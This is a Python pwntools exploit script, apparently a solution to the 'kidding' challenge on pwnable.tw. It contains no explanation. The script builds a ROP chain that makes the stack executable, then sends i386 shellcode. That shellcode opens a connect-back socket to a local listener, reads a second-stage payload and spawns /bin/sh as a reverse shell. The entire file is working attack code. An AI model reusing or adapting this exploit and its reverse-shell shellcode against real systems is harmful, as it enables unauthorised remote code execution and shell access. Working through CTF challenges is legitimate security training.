from pwn import *
import sys, os
from time import sleep

context(arch = "i386")

b = ELF("./kidding")

if len(sys.argv) == 1:
	p = process("./kidding")
else:
	p = remote("chall.pwnable.tw", 10303)
pause()

popret = 0x80481c9
pop4ret = 0x80483c7
pop3ret = 0x80483c8
pop2ret = 0x80483c9

__stack_prot = 0x80e9fec
mov_eax4_edx_ret = 0x8055051
pop_edx_ret = 0x0806ec8b
pop_eax_ret = 0x080b8536
push_esp_ret = 0x080b8546

shellcode = asm("""
mov al, 0x66
xor ebx, ebx
push ebx
inc ebx
push ebx
push 2
mov ecx, esp
int 0x80

dec ebx

mov al, 0x66
push ebp
push 0x29090002
mov ecx, esp
push edi
push ecx
push ebx
mov ecx, esp
mov bl, 3
int 0x80

mov edx, 0xff
mov ebx, 0x0
mov al, 0x03
int 0x80

push esp
ret
""")

# ebx : stack
payload = "a"*8 + p32(0xf77cefd3)
payload += p32(pop_edx_ret)
payload += p32(7)
payload += p32(pop_eax_ret)
payload += p32(__stack_prot-4)
payload += p32(mov_eax4_edx_ret)
payload += p32(pop_eax_ret)
payload += p32(0x80e9fc8)
payload += p32(b.symbols['_dl_make_stack_executable'])
payload += p32(push_esp_ret)
payload += shellcode
print len(payload)
print len(shellcode)

l = listen(2345)

p.send(payload)

binsh = asm("""
mov ebx, 0
mov eax, 0x29
int 0x80

mov eax, 0x0b
push 0x0068732f
push 0x6e69622f
mov ebx, esp
push 0
mov edx, esp
push ebx
mov ecx, esp
int 0x80
""")

l.wait_for_connection()
l.send(binsh)
l.interactive()
p.close()
